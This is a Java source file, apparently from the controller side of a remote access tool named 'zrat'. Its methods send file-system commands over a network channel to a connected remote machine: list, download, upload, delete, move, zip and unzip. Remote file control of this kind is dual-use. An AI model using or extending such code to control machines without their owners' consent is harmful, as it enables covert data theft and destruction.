package com.zrat.client.controller;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.jboss.netty.channel.Channel;
import org.jboss.netty.channel.ChannelFuture;

import com.zrat.client.nio.listener.FileTransferFutureListener;
import com.zrat.client.nio.listener.ResponseMsg;
import com.zrat.client.ui.Client;
import com.zrat.client.util.Utils;
import com.zrat.transfer.model.RemoteFile;
import com.zrat.transfer.model.TransferDataStruct;

public class FileServiceImpl extends BaseService implements FileService {

	public FileServiceImpl(Channel channel) {
		super(channel);
	}

	@Override
	public void copyFile(String fileName, String targetPath) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_COPYFILE);
		dataStruct.setObject(new String[] { fileName, targetPath });
		channel.write(dataStruct);
	}

	@Override
	public void createDic(String path, String fileName) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_CREATEDIRECTORY);
		String[] strs = new String[] { path, fileName };
		dataStruct.setObject(strs);
		channel.write(dataStruct);
	}

	@Override
	public void createFile(String path, String fileName) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_CREATEFILE);
		String[] strs = new String[] { path, fileName };
		dataStruct.setObject(strs);
		channel.write(dataStruct);
	}

	@Override
	public void cutFile(String fileName, String targetPath) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_CUTFILE);
		String[] strs = new String[] { fileName, targetPath };
		dataStruct.setObject(strs);
		channel.write(dataStruct);
	}

	@Override
	public void deleteFile(List<RemoteFile> files) {
		String[] path = new String[files.size()];
		for(int i=0;i<files.size();i++){
			RemoteFile file  = files.get(i);
			 path[i]= file.getPath();
		}
		dataStruct = new TransferDataStruct(FileService.COMMAND_DELETEFILE);
		dataStruct.setObject(path);
		channel.write(dataStruct);
	}

	@Override
	public void download(String remoteFile,long size) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_DOWNLOAD);
//		File file = new File(localFile);
//		String[] strs = new String[] { remoteFile, localFile, "0" };
//		if (file.exists()) {
//			if (file.length() < size) {
//				strs[2] = size + "";
//			} else {
//				if (JOptionPane.showConfirmDialog(RatUIManager.getMainPanel(),
//						"文件已经存在，是否需要覆盖？") != JOptionPane.OK_OPTION) {
//					return;
//				}
//			}
//
//		}
		dataStruct.setObject(remoteFile);
		channel.write(dataStruct);
	}

	public void download(List<RemoteFile> remoteFile) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_DOWNLOAD);
		String filePath = System.getProperty("user.dir") + File.separator
				+ DOWNLOADDIC;
		File dic = new File(filePath);
		if (!dic.exists()) {
			dic.mkdirs();
		}

		Map<String, Long> map = new HashMap<String, Long>();
		int i=0;
		String[] files = new String[remoteFile.size()];
		for(RemoteFile rf : remoteFile){
			
			files[i]=rf.getPath();
			i++;
			map.put(rf.getPath(), rf.getSize());
		}
		Client.getServer(channel.getId()).setDownloadFiles(map);
		dataStruct.setObject(files);
		channel.write(dataStruct);
	}

	@Override
	public void getFiles(String path) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_SHOWFILES);
		dataStruct.setObject(path);
		channel.write(dataStruct);
	}

	@Override
	public void getRoots() {
		dataStruct = new TransferDataStruct(FileService.COMMAND_SHOWROOTS);
		channel.write(dataStruct);
	}

	@Override
	public void unZipFile(String fileName) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_UNZIPFILE);
		String[] strs = new String[] { fileName };
		dataStruct.setObject(strs);
		channel.write(dataStruct);
	}

	public void unZipFile(String fileName, String path) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_UNZIPFILE);
		String[] strs = new String[] { fileName, path };
		dataStruct.setObject(strs);
		channel.write(dataStruct);
	}

	@Override
	public void uploadFile(String file, String path, String fileName, long size) {

		// String[] strs = (String[]) data.getObject();
		// RandomAccessFile raf = service.download(strs[0],strs[2]);

	}

	@Override
	public void zipFile(String path) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_ZIPFILE);
		String[] strs = new String[] { path };
		dataStruct.setObject(strs);
		channel.write(dataStruct);
	}

	public void zipFile(String path, String fileName) {
		dataStruct = new TransferDataStruct(FileService.COMMAND_ZIPFILE);
		String[] strs = new String[] { path, fileName };
		dataStruct.setObject(strs);
		channel.write(dataStruct);
	}

	@Override
	public void uploadFile(File[] files, String path) {
		
		TransferDataStruct fileData = new TransferDataStruct(
				FileService.COMMAND_UPLOADFILE);

		ResponseMsg re = new ResponseMsg();
		String filePath = "";
		for (File file : files) {
			filePath = Utils.buildFilePath(channel.getId(),path,file.getName());
			re.addFile(file.getAbsolutePath());
			System.out.println("upload file: "+file.getAbsolutePath());
			re.putFileSize(filePath, file.length());
		}
		fileData.setObject(Utils.buildFilePath(channel.getId(),path,files[0].getName()));
		try {
			ChannelFuture fu = channel.write(fileData);
			fu.addListener(new FileTransferFutureListener(re, 0,path));
		} catch (IOException e1) {
			e1.printStackTrace();
		}

	}

}
